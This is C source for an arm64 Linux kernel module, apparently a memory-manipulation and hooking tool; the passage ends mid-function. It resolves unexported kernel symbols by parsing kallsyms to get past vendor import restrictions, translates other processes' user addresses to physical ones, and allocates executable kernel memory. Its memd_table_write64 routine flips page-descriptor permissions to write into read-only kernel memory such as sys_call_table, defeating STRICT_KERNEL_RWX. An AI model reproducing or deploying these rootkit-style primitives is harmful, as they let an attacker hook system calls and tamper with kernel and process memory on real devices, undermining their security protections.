#include "memd_utils.h"
#include "memd_kallsyms.h"
#include "memd_learn.h"

#include <asm/sysreg.h>
#include <linux/atomic.h>
#include <linux/capability.h>
#include <linux/compiler.h>
#include <linux/errno.h>
#include <linux/err.h>
#include <linux/input.h>
#include <linux/preempt.h>
#include <linux/sched/signal.h>
#include <linux/stdarg.h>
#include <linux/hugetlb.h>
#include <linux/interrupt.h>
#include <linux/mm.h>
#include <linux/pgtable.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>
#include <linux/vmalloc.h>

#include "hijack_arm64.h"
#include "linux/pid.h"

#ifdef CONFIG_CFI_CLANG
#define NO_CFI __nocfi
#else
#define NO_CFI
#endif

/* Floor is 5.10 (single universal image): filp_open is namespace-gated
 * there and up, so always resolve it at runtime. The cached pointer is
 * published via a local: concurrent first-use must never call a
 * half-stored pointer, and a failed lookup retries next call. */
int memd_filp_open(const char* filename, int flags, umode_t mode, struct file** f) {
    static struct file* (*reserve_flip_open)(const char* filename, int flags, umode_t mode) = NULL;
    struct file* (*tmp)(const char* filename, int flags, umode_t mode);
    int err;

    if (!f || !filename) {
        return -EINVAL;
    }
    tmp = READ_ONCE(reserve_flip_open);
    if (tmp == NULL) {
        tmp =
            (struct file * (*)(const char* filename, int flags, umode_t mode)) kallsyms_lookup_name_ex("filp_open");
        if (tmp == NULL) {
            *f = NULL;
            return -ENODEV;
        }
        WRITE_ONCE(reserve_flip_open, tmp);
    }

    *f = tmp(filename, flags, mode);
    /* filp_open returns ERR_PTR, never NULL, on failure: a bare NULL
     * check would report success (0) with an error handle, so propagate
     * the encoded errno and clear the handle (fail closed). */
    if (IS_ERR_OR_NULL(*f)) {
        err = !*f ? -EFAULT : (int)PTR_ERR(*f);
        *f = NULL;
        return err;
    }
    return 0;
}

int memd_filp_close(struct file** f, fl_owner_t id) {
    static void (*reserve_flip_close)(struct file *f, fl_owner_t id) = NULL;
    void (*tmp)(struct file *f, fl_owner_t id);

    if (!f) {
        return -EINVAL;
    }
    tmp = READ_ONCE(reserve_flip_close);
    if (tmp == NULL) {
        tmp = (void (*)(struct file *f, fl_owner_t id)) kallsyms_lookup_name_ex("filp_close");
        if (tmp == NULL) {
            return -ENODEV; /* resolver missing: same fail-closed code as memd_kernel_read */
        }
        WRITE_ONCE(reserve_flip_close, tmp);
    }

    if (!*f) {
        return -EINVAL;
    }
    /* filp_close takes the pointer itself (void return); the wrapper
     * takes its address so the handle dies here, never dangles. */
    tmp(*f, id);
    *f = NULL;
    return 0;
}

/* kernel_read without the import (GKI-protected on trimmed kernels).
 * Resolved through the kallsyms table once the bootstrap ioctl lands;
 * -ENODEV until then. Callers already treat <0 as failure. */
ssize_t memd_kernel_read(struct file *f, void *buf, size_t count, loff_t *pos)
 {
    static ssize_t (*fn)(struct file *, void *, size_t, loff_t *) = NULL;
    ssize_t (*tmp)(struct file *, void *, size_t, loff_t *);
    if (!f || !buf || !pos)
        return -EINVAL;
    /* Publish via a local: concurrent first-use must never call a
     * half-stored pointer, and a failed lookup retries next call. */
    tmp = READ_ONCE(fn);
    if (!tmp) {
        tmp = (void *)kallsyms_lookup_name_ex("kernel_read");
        if (!tmp)
            return -ENODEV;
        WRITE_ONCE(fn, tmp);
    }
    return tmp(f, buf, count, pos);
}

/* __put_cred without the import (same story). Drop-a-ref only. */
void memd_put_cred(struct cred *cred)
 {
    static void (*fn)(struct cred *) = NULL;
    void (*tmp)(struct cred *);
    if (!cred)
        return;
    tmp = READ_ONCE(fn);
    if (!tmp) {
        tmp = (void *)kallsyms_lookup_name_ex("__put_cred");
        if (!tmp)
            return;
        WRITE_ONCE(fn, tmp);
    }
    tmp(cred);
}

/* Signal delivery without the send_signal import (trimmed on some
 * kernels). do_send_sig_info has the same (sig, info, task, type)
 * shape; prefer send_signal where it resolves. -ESRCH when neither
 * is available. */
int memd_send_signal(int sig, struct siginfo *info,
                     struct task_struct *task, enum pid_type type)
 {
    static int (*fn_send)(int, struct kernel_siginfo *,
                          struct task_struct *, enum pid_type) = NULL;
    static int (*fn_do)(int, struct kernel_siginfo *,
                        struct task_struct *, enum pid_type) = NULL;
    int (*tmp_send)(int, struct kernel_siginfo *,
                    struct task_struct *, enum pid_type);
    int (*tmp_do)(int, struct kernel_siginfo *,
                  struct task_struct *, enum pid_type);
    if (!task || !info)
        return -ESRCH;
    /* Each entry resolves on its own (no shared "probed" flag: a racing
     * caller must never observe probed=true with both still NULL). */
    tmp_send = READ_ONCE(fn_send);
    if (!tmp_send) {
        tmp_send = (void *)kallsyms_lookup_name_ex("send_signal");
        if (tmp_send)
            WRITE_ONCE(fn_send, tmp_send);
    }
    tmp_do = READ_ONCE(fn_do);
    if (!tmp_do) {
        tmp_do = (void *)kallsyms_lookup_name_ex("do_send_sig_info");
        if (tmp_do)
            WRITE_ONCE(fn_do, tmp_do);
    }
    /* struct siginfo shares the si_signo/si_errno/si_code prefix the
     * callee reads; same object the direct call always passed. */
    if (tmp_send)
        return tmp_send(sig, (struct kernel_siginfo *)info, task, type);
    if (tmp_do)
        return tmp_do(sig, (struct kernel_siginfo *)info, task, type);
    return -ESRCH;
}

/* Executable allocation without the vmalloc_exec import (trimmed on
 * some kernels): plain vmalloc (universally imported) + set_memory_x
 * through the table. NULL when the remap helper is unavailable. */
void *memd_vmalloc_exec(unsigned long size)
 {
    static int (*fn_set_x)(unsigned long, int) = NULL;
    int (*tmp_set_x)(unsigned long, int);
    unsigned long aligned;
    void *p;
    if (!size)
        return NULL;
    /* PAGE_ALIGN wraps to 0 near ULONG_MAX: refuse instead of asking
     * set_memory_x to remap 0 pages over a huge vmalloc. */
    aligned = PAGE_ALIGN(size);
    if (!aligned || aligned < size)
        return NULL;
    tmp_set_x = READ_ONCE(fn_set_x);
    if (!tmp_set_x) {
        tmp_set_x = (void *)kallsyms_lookup_name_ex("set_memory_x");
        if (!tmp_set_x)
            return NULL;
        WRITE_ONCE(fn_set_x, tmp_set_x);
    }
    p = vmalloc(size);
    if (!p)
        return NULL;
    if (tmp_set_x((unsigned long)p, (int)(aligned >> PAGE_SHIFT))) {
        vfree(p);
        return NULL;
    }
    return p;
}

/* struct input_dev plausibility without the input_dev_valid import
 * (absent on trimmed kernels). Canonical pointer + probe-readable
 * name/phys header words; anything else is -EINVAL. Fail closed. */
int memd_input_dev_ok(struct input_dev *dev)
 {
    unsigned long w;
    if (!dev || ((unsigned long)dev & 0xffff000000000000UL) != 0xffff000000000000UL)
        return -EINVAL;
    /* struct input_dev head: name, phys, uniq are the first pointers. */
    if (memd_safe_read64(&((struct input_dev *)dev)->name, &w))
        return -EINVAL;
    if (w && (w & 0xffff000000000000UL) != 0xffff000000000000UL)
        return -EINVAL;
    if (memd_safe_read64(&((struct input_dev *)dev)->phys, &w))
        return -EINVAL;
    if (w && (w & 0xffff000000000000UL) != 0xffff000000000000UL)
        return -EINVAL;
    return 0;
}

/* Logging without the _printk import: vprintk resolved once through
 * the table. Pre-bootstrap drops are counted, and the first call that
 * resolves vprintk reports the loss once — a loud early failure must
 * not vanish silently when userspace needs it after bootstrap. */
int memd_printk(const char *fmt, ...)
 {
    static int (*fn)(const char *, va_list) = NULL;
    static atomic_long_t dropped;
    int (*tmp)(const char *, va_list);
    va_list ap;
    int r;
    long d;
    /* NULL format is a no-op success: logging must never fail its caller. */
    if (!fmt)
        return 0;
    tmp = READ_ONCE(fn);
    if (!tmp) {
        tmp = (void *)kallsyms_lookup_name_ex("vprintk");
        if (!tmp) {
            /* Re-check before dropping: a racing CPU may have
             * published fn while this lookup ran. Printing through
             * it keeps the message (and keeps the drop count exact:
             * an increment after the reporter's claim below would
             * otherwise strand a count no future report can claim,
             * since fn stays published). A stale NULL here only
             * costs one counted drop, never a fault. */
            tmp = READ_ONCE(fn);
            if (!tmp) {
                /* Saturating RMW: a pre-bootstrap storm must never
                 * wrap the counter (signed overflow) and concurrent
                 * increments must never be lost to a torn
                 * read-modify-write; the loss report stays exact
                 * until the cap, then pins. */
                atomic_long_add_unless(&dropped, 1, 2147483647L);
                return 0;
            }
        } else {
            WRITE_ONCE(fn, tmp);
            /* Atomic claim: the old READ/reset pair let two CPUs
             * that both missed fn read the same N and report 2N,
             * and a racing increment could be overwritten by the
             * reset. xchg makes the claim single-winner (losers see
             * 0); concurrent increments land either inside the
             * claimed N or after it, never double-counted. */
            d = atomic_long_xchg(&dropped, 0);
            if (d > 0) {
                /* Report through memd_printk, not tmp directly: tmp is
                 * vprintk and takes a va_list, so handing it the count
                 * would feed a small integer as the varargs pointer and
                 * oops on first use. The recursive call is depth-1 (fn
                 * is already published, so it takes the fast path). */
                memd_printk(KERN_WARNING MEMD_LOG_PREFIX
                    "early messages dropped before bootstrap: %ld\n", d);
            }
        }
    }
    va_start(ap, fmt);
    r = tmp(fmt, ap);
    va_end(ap);
    return r;
}

bool is_file_exist(const char* filename) {
    struct file* fp;

    if (memd_filp_open(filename, O_RDONLY, 0, &fp) == 0) {
        if (!IS_ERR(fp)) {
            memd_filp_close(&fp, NULL);
            return true;
        }
        return false;
    }

    //    // int kern_path(const char *name, unsigned int flags, struct path *path)
    //    struct path path;
    //    if (kern_path(filename, LOOKUP_FOLLOW, &path) == 0) {
    //        return true;
    //    }

    return false;
}


pte_t* page_from_virt_user(struct mm_struct* mm, uintptr_t va) {
    pgd_t* pgd;
    p4d_t* p4d;
    pud_t* pud;
    pmd_t* pmd;
    pte_t* ptep = NULL;

    /* no mmap_lock: universal image (offset varies); mm pinned + fail-closed walk */
    if (!mm) {
        return NULL;
    }

    pgd = pgd_offset(mm, va);
    if (pgd_none(*pgd) || pgd_bad(*pgd)) {
        memd_warn("PGD entry for address 0x%lx not found or bad\n", va);
        goto out;
    }

    p4d = p4d_offset(pgd, va);
    if (p4d_none(*p4d) || p4d_bad(*p4d)) {
        memd_warn("P4D entry for address 0x%lx not found or bad\n", va);
        goto out;
    }

    pud = pud_offset(p4d, va);
    if (pud_none(*pud) || pud_bad(*pud)) {
        memd_warn("PUD entry for address 0x%lx not found or bad\n", va);
        goto out;
    }

    if (pud_leaf(*pud)) {
        memd_debug("Address 0x%lx maps to a PUD-level huge page (leaf), no PTE exists\n", va);
        goto out;
    }

    pmd = pmd_offset(pud, va);
    if (pmd_none(*pmd) || pmd_bad(*pmd)) {
        memd_warn("PMD entry for address 0x%lx not found or bad\n", va);
        goto out;
    }

    if (pmd_leaf(*pmd)) {
        memd_debug("Address 0x%lx maps to a PMD-level huge page (leaf), no PTE exists\n", va);
        goto out;
    }

    ptep = pte_offset_kernel(pmd, va);
    if (!ptep) {
        memd_warn("Failed to map PTE for address 0x%lx\n", va);
        goto out;
    }
out:
    /* no mmap_lock: universal image (offset varies); mm pinned + fail-closed walk */

    return ptep;
}

/* Guarded user page-table walk (universal fail-closed). Every table
 * dereference goes through the extable guard; pgd comes from runtime
 * validation (never bare headers). A wrong pgd, a bad VA, or a
 * concurrent teardown returns 0 — never a fault.
 *
 * Round-5 re-examination: child pointers descend from live entries
 * while validation runs on snapshots, so a racing munmap can in
 * theory substitute a recycled (present-shaped) table and
 * mistranslate. Closing that needs mmap_lock (unavailable: its offset
 * varies by generation) or snapshot-derived descent (version-sensitive
 * mask arithmetic: higher risk than the race it would narrow); a
 * bounded retry would not converge under continuous teardown either.
 * Every faulting access is already extable-guarded and every level
 * re-checks none/bad/leaf/present, so the residual is a wrong (not
 * wild) phys under an actively racing teardown — accepted owner risk,
 * fail-closed everywhere else. No code change: irreducible. */
uintptr_t vaddr_to_phy_addr(struct mm_struct* mm, uintptr_t va) {
    unsigned long pgd_base, v;
    pgd_t *pgdp;
    p4d_t *p4dp;
    pud_t *pudp;
    pmd_t *pmdp;
    pte_t *ptep;
    unsigned long pte_v;
    if (!mm) {
        memd_warn("mm_struct is NULL, cannot perform translation\n");
        return 0;
    }
    pgd_base = memd_valid_pgd(mm);
    if (!pgd_base)
        return 0;
    pgdp = (pgd_t *)pgd_base + pgd_index(va);
    if (memd_safe_read64(pgdp, &v))
        return 0;
    if (pgd_none(__pgd(v)) || pgd_bad(__pgd(v)))
        return 0;
    /* p4d is folded into the pgd entry on arm64, so p4d_offset() takes
     * the ENTRY pointer: passing the table base only coincides when
     * pgd_index(va) is 0, and higher user VAs walked the wrong entry
     * (fail-closed today, wrong translation all the same). The kernel-
     * VA walkers below already pass the entry; match them. */
    p4dp = p4d_offset(pgdp, va);
    if (memd_safe_read64(p4dp, &v))
        return 0;
    if (p4d_none(__p4d(v)) || p4d_bad(__p4d(v)))
        return 0;
    pudp = (pud_t *)pud_offset((p4d_t *)p4dp, va);
    if (memd_safe_read64(pudp, &v))
        return 0;
    if (pud_none(__pud(v)) || pud_bad(__pud(v)))
        return 0;
    if (pud_leaf(__pud(v)))
        return 0;
    pmdp = (pmd_t *)pmd_offset((pud_t *)pudp, va);
    if (memd_safe_read64(pmdp, &v))
        return 0;
    if (pmd_none(__pmd(v)) || pmd_bad(__pmd(v)))
        return 0;
    if (pmd_leaf(__pmd(v)))
        return 0;
    ptep = pte_offset_kernel((pmd_t *)pmdp, va);
    if (!ptep)
        return 0;
    if (memd_safe_read64(ptep, &pte_v))
        return 0;
    if (!pte_present(__pte(pte_v)))
        return 0;
    return (pte_pfn(__pte(pte_v)) << PAGE_SHIFT) + (va & (PAGE_SIZE - 1));
}

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

/* Universal resolution: /proc/kallsyms self-parse (memd_kallsyms.c). No
 * kprobe imports of any kind — vendor loaders reject GOT-page relocs
 * against even weak kprobe references, so the kprobe trick can never be
 * in a universal image. kptr_restrict hiding addresses is the fail-soft
 * boundary (callers already degrade to "not found"). */
unsigned long kallsyms_lookup_name_ex(const char* name) {
    return memd_kallsyms(name);
}

/* memd_pfn_ok: pfn_valid without the import. 5.10-baseline headers emit a
 * real pfn_valid call, but some vendor kernels (proven: Samsung 5.15) do
 * not export it. Chain: the kernel's own function via runtime parse
 * (exact semantics) -> max_pfn variable via parse (bound) -> top bound
 * (callers additionally enforce DRAM-range + page-walk validation, so
 * the bound can only over-approximate holes, never grant bad access). */
static int (*memd_pfn_valid_fn)(unsigned long) = NULL;
static unsigned long *memd_max_pfn_ptr;
static bool memd_pfn_probed;

/* Boolean, not errno: 1 usable, 0 not (over-approximates holes, never grants bad access). */
int memd_pfn_ok(unsigned long pfn) {
    int (*valid_fn)(unsigned long);
    unsigned long *max_ptr;
    valid_fn = READ_ONCE(memd_pfn_valid_fn);
    max_ptr = READ_ONCE(memd_max_pfn_ptr);
    if (!READ_ONCE(memd_pfn_probed)) {
        if (!valid_fn) {
            valid_fn = (int (*)(unsigned long))memd_kallsyms("pfn_valid");
            if (valid_fn)
                WRITE_ONCE(memd_pfn_valid_fn, valid_fn);
        }
        if (!max_ptr) {
            max_ptr = (unsigned long *)memd_kallsyms("max_pfn");
            if (max_ptr)
                WRITE_ONCE(memd_max_pfn_ptr, max_ptr);
        }
        /* Latch only once a real source exists: pfn_valid is a static
         * inline on several kernels (never a kallsyms symbol), so it
         * may legitimately stay NULL — max_pfn alone is a sound bound.
         * Latching all-NULL pre-bootstrap would pin the 64GB guess
         * after the bootstrap lands instead of re-resolving. Last: a
         * racing caller that observes probed=true is then guaranteed
         * tear-free pointer loads below. Either fallback only
         * over-approximates holes, never grants bad access. */
        if (valid_fn || max_ptr)
            WRITE_ONCE(memd_pfn_probed, true);
    }
    if (valid_fn)
        return valid_fn(pfn);
    max_ptr = READ_ONCE(memd_max_pfn_ptr);
    if (max_ptr)
        return pfn < READ_ONCE(*max_ptr);
    return pfn < ((64UL << 30) >> PAGE_SHIFT);
}

struct task_struct* get_target_task(pid_t pid) {
    struct pid* pid_struct = find_get_pid(pid);
    if (!pid_struct) {
        return NULL;
    }

    struct task_struct* task = get_pid_task(pid_struct, PIDTYPE_PID);
    put_pid(pid_struct);
    if (!task) {
        return NULL;
    }

    return task;
}

struct vm_area_struct* memd_find_vma(struct mm_struct* mm, unsigned long addr) {
    static struct vm_area_struct* (*vma_find)(struct mm_struct*, unsigned long) = NULL;
    struct vm_area_struct* (*tmp)(struct mm_struct*, unsigned long);
    if (!mm) {
        return NULL;
    }
    /* Resolve on each miss (no "probed" latch): a racing caller must
     * never observe probed=true with the pointer still NULL. */
    tmp = READ_ONCE(vma_find);
    if (!tmp) {
        tmp = (void*)kallsyms_lookup_name_ex("find_vma");
        if (!tmp) {
            tmp = (void*)kallsyms_lookup_name_ex("__find_vma");
        }
        if (!tmp) {
            return NULL;
        }
        WRITE_ONCE(vma_find, tmp);
    }
    return tmp(mm, addr);
}

void compare_pt_regs(struct pt_regs* regs1, struct pt_regs* regs2) {
#if CONFIG_COMPARE_PT_REGS == 1
    int i;
    memd_info("==> Comparing pt_regs:\n");

    for (i = 0; i < 31; ++i) {
        if (regs1->regs[i] != regs2->regs[i]) {
            memd_info("reg[%d] changed from %llx to %llx\n", i, regs1->regs[i], regs2->regs[i]);
        }
    }

    if (regs1->sp != regs2->sp) {
        memd_info("sp changed from %llx to %llx\n", regs1->sp, regs2->sp);
    }

    if (regs1->pc != regs2->pc) {
        memd_info("pc changed from %llx to %llx\n", regs1->pc, regs2->pc);
    }

    if (regs1->pstate != regs2->pstate) {
        memd_info("pstate changed from %llx to %llx\n", regs1->pstate, regs2->pstate);
    }

    if (regs1->sdei_ttbr1 != regs2->sdei_ttbr1) {
        memd_info("sdei_ttbr1 changed from %llx to %llx\n", regs1->sdei_ttbr1, regs2->sdei_ttbr1);
    }

    if (regs1->pmr_save != regs2->pmr_save) {
        memd_info("pmr_save changed from %llx to %llx\n", regs1->pmr_save, regs2->pmr_save);
    }

    if (regs1->stackframe[0] != regs2->stackframe[0] || regs1->stackframe[1] != regs2->stackframe[1]) {
        memd_info("stackframe changed from [%llx, %llx] to [%llx, %llx]\n", regs1->stackframe[0], regs1->stackframe[1],
                 regs2->stackframe[0], regs2->stackframe[1]);
    }
#endif
}

void compare_task_struct(struct task_struct* task1, struct task_struct* task2) {
#if CONFIG_COMPARE_TASK == 1
    memd_info("==> Comparing task_struct:\n");
#ifdef CONFIG_THREAD_INFO_IN_TASK
    if (task1->thread_info.flags != task2->thread_info.flags) {
        memd_info("thread_info.flags changed from %lx to %lx\n", task1->thread_info.flags, task2->thread_info.flags);
    }

    if (task1->thread_info.cpu != task2->thread_info.cpu) {
        memd_info("thread_info.cpu changed from %d to %d\n", task1->thread_info.cpu, task2->thread_info.cpu);
    }
#endif

    if (task1->__state != task2->__state) {
        memd_info("__state changed from %u to %u\n", task1->__state, task2->__state);
    }

    if (task1->stack != task2->stack) {
        memd_info("stack pointer changed from %p to %p\n", task1->stack, task2->stack);
    }

    if (task1->flags != task2->flags) {
        memd_info("flags changed from %u to %u\n", task1->flags, task2->flags);
    }

    if (task1->ptrace != task2->ptrace) {
        memd_info("ptrace changed from %u to %u\n", task1->ptrace, task2->ptrace);
    }

    if (task1->pid != task2->pid) {
        memd_info("pid changed from %d to %d\n", task1->pid, task2->pid);
    }

    if (task1->tgid != task2->tgid) {
        memd_info("tgid changed from %d to %d\n", task1->tgid, task2->tgid);
    }
#endif
}

#define W_PHYS_PFN(x) ((unsigned long)((x) >> PAGE_SHIFT))
#define memd_phys_to_pfn(paddr) W_PHYS_PFN(paddr)

struct page* vaddr_to_page(struct mm_struct* mm, uintptr_t va) {
#if !defined(pfn_to_page)
#error "vaddr_to_page failed: pfn_to_page not found"
#endif
    /* Fail closed: vaddr_to_phy_addr returns 0 for unmapped/bad VAs and
     * pfn 0 would otherwise alias the (possibly present) page 0 struct,
     * leaking its flags/counts to the caller. memd_pfn_ok is the
     * import-free pfn_valid chain (runtime kallsyms -> max_pfn bound). */
    uintptr_t pa = vaddr_to_phy_addr(mm, va);
    if (!pa)
        return NULL;
    if (!memd_pfn_ok(memd_phys_to_pfn(pa)))
        return NULL;
    return pfn_to_page(memd_phys_to_pfn(pa));
}

/* Kernel-VA translation without struct trust: task/mm layouts also skew
 * across OEMs (proven: active_mm/pgd chain lands outside the image), so
 * read TTBR1_EL1 (swapper pgd phys, a register, no structs) and walk
 * physically, resolving each table VA via the linear map. Every table
 * read is extable-guarded (tables mutate under us). Leaf-aware (kernel
 * text is block-mapped). Read-only; never for kernel-text writes. */
int memd_safe_read64(const void *src, unsigned long *dst)
 {
    unsigned long v;
    int err = -EFAULT;
    asm volatile(
        "1: ldr %1, [%2]\n"
        "   mov %w0, #0\n"
        "2:\n"
        "   .pushsection __ex_table, \"a\"\n"
        "   .balign 4\n"
        "   .long (1b - .), (2b - .)\n"
        "   .popsection\n"
        : "+r" (err), "=r" (v) : "r" (src) : "memory");
    if (!err)
        *dst = v;
    return err;
}

int memd_safe_read32(const void *src, unsigned int *dst)
 {
    unsigned int v;
    int err = -EFAULT;
    asm volatile(
        "1: ldr %w1, [%2]\n"
        "   mov %w0, #0\n"
        "2:\n"
        "   .pushsection __ex_table, \"a\"\n"
        "   .balign 4\n"
        "   .long (1b - .), (2b - .)\n"
        "   .popsection\n"
        : "+r" (err), "=r" (v) : "r" (src) : "memory");
    if (!err)
        *dst = v;
    return err;
}

/* Guarded u64 store (extable fixup on fault). Used for PTE AP flips and
 * table entries that may be mapped read-only. */
int memd_safe_write64(void *dst, unsigned long v)
 {
    int err = -EFAULT;
    asm volatile(
        "1: str %1, [%2]\n"
        "   mov %w0, #0\n"
        "2:\n"
        "   .pushsection __ex_table, \"a\"\n"
        "   .balign 4\n"
        "   .long (1b - .), (2b - .)\n"
        "   .popsection\n"
        : "+r" (err) : "r" (v), "r" (dst) : "memory");
    return err;
}

/* 32-bit twin of memd_safe_write64: same extable guard, word store. */
int memd_safe_write32(void *dst, unsigned int v)
 {
    int err = -EFAULT;
    asm volatile(
        "1: str %w1, [%2]\n"
        "   mov %w0, #0\n"
        "2:\n"
        "   .pushsection __ex_table, \"a\"\n"
        "   .balign 4\n"
        "   .long (1b - .), (2b - .)\n"
        "   .popsection\n"
        : "+r" (err) : "r" (v), "r" (dst) : "memory");
    return err;
}

/* Write a u64 to a possibly read-only kernel page (e.g. sys_call_table
 * under STRICT_KERNEL_RWX): walk TTBR1 to the covering descriptor,
 * flip AP to writable, local TLBI, guarded store, readback verify,
 * exact descriptor restore, TLBI again. Zero new imports, no hypercalls.
 * RKP-active kernels may trap the descriptor write itself (accepted
 * owner risk); plain faults become clean errors, never panics. */
int memd_table_write64(unsigned long entry_va, unsigned long val)
 {
    unsigned long ttbr, base, v;
    pgd_t pgd;
    p4d_t p4d;
    pud_t pud;
    pmd_t pmd;
    unsigned long desc_va = 0;
    unsigned long orig_desc = 0;
    unsigned long rw_desc;
    int need_flip = 0;
    int ret = -EFAULT;

    ttbr = read_sysreg(ttbr1_el1);
    base = ttbr & 0x0000FFFFFFFFF000UL;
    if (!base) {
            memd_err("table_write64: stage 0 fail va=%lx\n", entry_va);
        return -EFAULT;
    }
    if (memd_safe_read64(phys_to_virt(base + (unsigned long)pgd_index(entry_va) * 8), &v)) {
            memd_err("table_write64: stage 1 fail va=%lx\n", entry_va);
        return -EFAULT;
    }
    pgd = __pgd(v);
    if (pgd_none(pgd) || pgd_bad(pgd)) {
            memd_err("table_write64: stage 2 fail va=%lx\n", entry_va);
        return -EFAULT;
    }
    {
        p4d_t *p = p4d_offset(&pgd, entry_va);
        if (memd_safe_read64(p, &v))
            {
                memd_err("table_write64: stage 3 fail va=%lx\n", entry_va);
                return -EFAULT;
        }
        p4d = __p4d(v);
        if (p4d_none(p4d) || p4d_bad(p4d))
            {
                memd_err("table_write64: stage 4 fail va=%lx\n", entry_va);
                return -EFAULT;
        }
    }
    {
        pud_t *p = pud_offset(&p4d, entry_va);
        if (memd_safe_read64(p, &v))
            {
                memd_err("table_write64: stage 5 fail va=%lx\n", entry_va);
                return -EFAULT;
        }
        pud = __pud(v);
        if (pud_none(pud))
            {
                memd_err("table_write64: stage 6 fail va=%lx\n", entry_va);
                return -EFAULT;
        }
    }
    if (!pud_leaf(pud)) {
        if (pud_bad(pud))
            {
                memd_err("table_write64: stage 7 fail va=%lx\n", entry_va);
                return -EFAULT;
        }
        pmd_t *p = pmd_offset(&pud, entry_va);
        if (memd_safe_read64(p, &v))
            {
                memd_err("table_write64: stage 8 fail va=%lx\n", entry_va);
                return -EFAULT;
        }
        pmd = __pmd(v);
        if (pmd_none(pmd))
            {
                memd_err("table_write64: stage 9 fail va=%lx\n", entry_va);
                return -EFAULT;
        }
        if (pmd_bad(pmd) && !pmd_leaf(pmd))
            {
                memd_err("table_write64: stage 10 fail va=%lx\n", entry_va);
                return -EFAULT;
        }
        if (!pmd_leaf(pmd)) {
            pte_t *p = pte_offset_kernel(&pmd, entry_va);
            desc_va = (unsigned long)p;
            if (memd_safe_read64(p, &v))
            {
                memd_err("table_write64: stage 11 fail va=%lx\n", entry_va);
                    return -EFAULT;
        }
            orig_desc = v;
        } else {
            desc_va = (unsigned long)pmd_offset(&pud, entry_va);
            orig_desc = v;
        }
    } else {
        desc_va = (unsigned long)pud_offset(&p4d, entry_va);
        orig_desc = v;
    }
    if (!(orig_desc & 1)) {
            memd_err("table_write64: stage 12 fail va=%lx\n", entry_va);
        return -EFAULT;
    }
    /* Descriptor sanity before touching anything: must be a table or
     * block descriptor whose output address is DRAM (not MMIO/device).
     * A mis-walked garbage descriptor fails here instead of corrupting
     * random page tables. AP[1] set means read-only at EL1. */
    {
        unsigned long out = orig_desc & 0x0000FFFFFFFFF000UL;
        unsigned long type = orig_desc & 3UL;
        if (type != 3UL && ((orig_desc & 3UL) != 1UL))
            {
                memd_err("table_write64: stage 13 fail va=%lx\n", entry_va);
                return -EFAULT;
        }
        if (out < 0x40000000UL || out >= (64UL << 30))
            {
                memd_err("table_write64: stage 14 fail va=%lx\n", entry_va);
                return -EFAULT;
        }
    }
    /* AP[1] (bit 7) set means read-only at EL1; clear it for the write.
     * Bit 7 is the RO bit for table, block and page descriptors alike. */
    rw_desc = orig_desc & ~0x80UL;
    need_flip = (rw_desc != orig_desc);
    preempt_disable();
    if (need_flip) {
        /* Break-Before-Make: changing AP on a live descriptor without a
         * break step leaves stale TLB entries (still RO) behind. Break
         * (invalidate), invalidate TLB, then make (RW), invalidate again. */
        if (memd_safe_write64((void *)desc_va, orig_desc & ~1UL)) {
            memd_err("table_write64: break store fail va=%lx\n", entry_va);
            goto out_preempt;
        }
        asm volatile("dsb ish\ntlbi vaae1, %0\ndsb ish\nisb\n" ::"r" (entry_va) : "memory");
        if (memd_safe_write64((void *)desc_va, rw_desc)) {
            memd_err("table_write64: flip store fail va=%lx\n", entry_va);
            goto out_preempt;
        }
        asm volatile("dsb ish\ntlbi vaae1, %0\ndsb ish\nisb\n" ::"r" (entry_va) : "memory");
    }
    /* Entry store with bounded retry (proven transient: first attempt
     * can fault on a stale RO TLB despite BBM+TLBI; immediate retry
     * succeeds. Still fail-closed after 3 — persistent failure is a
     * real problem, not a flake.) */
    {
        int attempt;
        for (attempt = 0; attempt < 3; attempt++) {
            if (!memd_safe_write64((void *)entry_va, val))
                break;
            if (attempt)
                memd_err("table_write64: entry store fail va=%lx (try %d)\n",
                         entry_va, attempt);
            asm volatile("dsb ish\ntlbi vaae1, %0\ndsb ish\nisb\n" ::"r" (entry_va) : "memory");
        }
        if (attempt >= 3) {
            memd_err("table_write64: entry store fail va=%lx\n", entry_va);
            goto restore;
        }
    }
    {
        unsigned long back = 0;
        if (memd_safe_read64((void *)entry_va, &back) || back != val) {
            memd_err("table_write64: readback mismatch va=%lx\n", entry_va);
            goto restore;
        }
    }
    ret = 0;
restore:
    if (need_flip) {
        /* BBM restore: break, invalidate, remake original, invalidate. */
        memd_safe_write64((void *)desc_va, orig_desc & ~1UL);
        asm volatile("dsb ish\ntlbi vaae1, %0\ndsb ish\nisb\n" ::"r" (entry_va) : "memory");
        memd_safe_write64((void *)desc_va, orig_desc);
        asm volatile("dsb ish\ntlbi vaae1, %0\ndsb ish\nisb\n" ::"r" (entry_va) : "memory");
    }
out_preempt:
    preempt_enable();
    return ret;
}

/* Page permissions + phys for a kernel VA without touching content
 * (safe on execute-only mappings): TTBR1 walk, descriptor metadata only.
 * 0 ok (fields filled, present=0 when unmapped), negative err. */
int memd_page_perms(uintptr_t va, uintptr_t *pa_out, unsigned *present_out,
                    unsigned *level_out, unsigned *ap_out, unsigned *xn_out,
                    unsigned long *desc_out)
 {
    unsigned long ttbr, base, v;
    pgd_t pgd;
    p4d_t p4d;
    pud_t pud;
    pmd_t pmd;

    *pa_out = 0;
    *present_out = 0;
    *level_out = 3;
    *ap_out = 0;
    *xn_out = 1;
    ttbr = read_sysreg(ttbr1_el1);
    base = ttbr & 0x0000FFFFFFFFF000UL;
    if (!base)
        return -EFAULT;
    if (memd_safe_read64(phys_to_virt(base + (unsigned long)pgd_index(va) * 8), &v))
        return 0;
    pgd = __pgd(v);
    if (desc_out)
        desc_out[0] = v;
    if (pgd_none(pgd) || pgd_bad(pgd))
        return 0;
    {
        p4d_t *p = p4d_offset(&pgd, va);
        if (memd_safe_read64(p, &v))
            return 0;
        p4d = __p4d(v);
        if (p4d_none(p4d) || p4d_bad(p4d))
            return 0;
    }
    {
        pud_t *p = pud_offset(&p4d, va);
        if (memd_safe_read64(p, &v))
            return 0;
        pud = __pud(v);
        if (desc_out)
            desc_out[1] = v;
        if (pud_none(pud))
            return 0;
    }
    *present_out = 1;
    if (pud_leaf(pud)) {
        *level_out = 0;
        *ap_out = (unsigned)((v >> 6) & 3);
        *xn_out = (unsigned)((v >> 53) & 3);
        *pa_out = (pud_pfn(pud) << PAGE_SHIFT) + (va & ((1UL << 30) - 1));
        return 0;
    }
    if (pud_bad(pud)) {
        *present_out = 0;
        return 0;
    }
    {
        pmd_t *p = pmd_offset(&pud, va);
        if (memd_safe_read64(p, &v))
